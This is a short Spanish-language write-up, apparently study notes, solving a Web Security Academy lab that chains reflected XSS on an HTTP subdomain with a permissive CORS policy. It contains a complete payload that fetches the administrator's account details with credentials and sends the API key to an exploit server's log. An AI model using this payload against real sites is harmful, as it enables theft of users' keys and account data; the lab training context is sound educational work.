En esta clase continuamos con la explotación del laboratorio anterior, donde la configuración CORS del servidor acepta solicitudes desde cualquier subdominio, incluso si estas provienen de un origen no seguro (HTTP).

Profundizamos en cómo aprovechar una vulnerabilidad de XSS reflejado en un subdominio que opera sobre HTTP, lo cual nos permite inyectar y ejecutar un script malicioso. Dicho script accede al endpoint sensible de la cuenta del administrador y, gracias a la configuración permisiva del servidor, la clave API es expuesta. Este valor es redirigido al servidor de explotación para completar con éxito el laboratorio.

Solucion
Segimos con el script

<script>
    document.location="http://stock.0a2e00b004e4e31e81c24391008f00ae.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a2e00b004e4e31e81c24391008f00ae.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a97004f0494e312811342b1019000de.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

el apikey me lo dio asi con los logs
![Pasted_image_20250728225235.png](Imagenes/Pasted_image_20250728225235.png)
